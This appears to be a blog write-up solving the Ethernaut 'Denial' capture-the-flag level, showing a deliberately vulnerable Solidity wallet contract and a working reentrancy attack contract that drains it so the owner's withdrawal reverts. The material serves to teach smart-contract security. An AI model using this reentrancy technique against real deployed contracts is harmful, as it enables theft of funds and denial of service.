###########################
Ethernaut 20: Denial
###########################
:date: 2023-10-15
:slug: ethernaut-20-denial
:summary: It's always reentrancy
:tags: programming
:author: capu
:featured_image:


Objective
=========
    This is a simple wallet that drips funds over time. You can withdraw the
    funds slowly by becoming a withdrawing partner.

    If you can deny the owner from withdrawing funds when they call withdraw()
    (whilst the contract still has funds, and the transaction is of 1M gas or
    less) you will win this level.

Code
====
.. code-block:: solidity
    :linenos: inline
    :hl_lines: 18 22

    contract Denial {
        // withdrawal partner - pay the gas, split the withdraw
        address public partner;
        address payable public constant owner = payable(address(0xA9E));
        uint256 timeLastWithdrawn;
        // keep track of partners balances
        mapping(address => uint256) withdrawPartnerBalances;

        function setWithdrawPartner(address _partner) public {
            partner = _partner;
        }

        // withdraw 1% to recipient and 1% to owner
        function withdraw() public {
            uint256 amountToSend = address(this).balance / 100;
            // perform a call without checking return
            // The recipient can revert, the owner will still get their share
            (bool sent,) = partner.call{value: amountToSend}("");
            owner.transfer(amountToSend);
            // keep track of last withdrawal time
            timeLastWithdrawn = block.timestamp;
            withdrawPartnerBalances[partner] += amountToSend;
        }

        // allow deposit of funds
        receive() external payable {}

        // convenience function
        function contractBalance() public view returns (uint256) {
            return address(this).balance;
        }
    }

This contract sort of implements a keeper pattern. It slowly drips funds to an
address when the ``withdraw()`` function is called. In order for that to happen
kind of automatically (there are no cron jobs on EVM-land), an incentive is
provided to whoever wants to call the function periodically. In this contract,
the address doing that work would be the ``partner``.

The level factory will try to call ``withdraw()``, and consider the level passed
if the call fails.

Solution
========
There are two parts to this:

First, the contract doesn't implement a check-effects-interactions pattern
properly, doing an external call to an untrusted address (line 16) before updating the
contract's state (line 20).

Then, the idea with this is to cause the ``withdraw()`` call to revert. Simply
rejecting when receiving ether won't work, as a low level ``call()`` is
performed against my contract, and the return value is explicitly ignored.

What I can do, however, is cause a revert on line 17 instead , since
``address.transfer(uint256 amount)`` reverts if the contract doesn't have enough
ether.

And the way to do that is with a reentrancy attack:

.. code-block:: solidity
    :linenos: inline
    :hl_lines: 8

    contract EvilPartner {
        uint256 private amountToSendToOwner;

        receive() external payable {
            if (amountToSendToOwner == 0 ) {
                amountToSendToOwner = msg.value;
            }
            while(msg.sender.balance > amountToSendToOwner) {
                Denial(payable(msg.sender)).withdraw();
            }
        }
    }

In line 8 I choose to keep withdrawing my alloted 1% over and over again up
until said amount is higher than the contract ``Denial`` contract balance. At
that point, I'm conviced transferring to the owner will revert, so I just
return.

Then, it's a matter of setting the withdraw partner to the attacker contract,
since the level factory will take care of calling the contract for me:

.. code-block:: solidity
    :linenos: inline

    function solution(address payable target_) internal override{
        Denial target = Denial(target_);
        EvilPartner attacker = new EvilPartner();
        target.setWithdrawPartner(address(attacker));
    }

😎
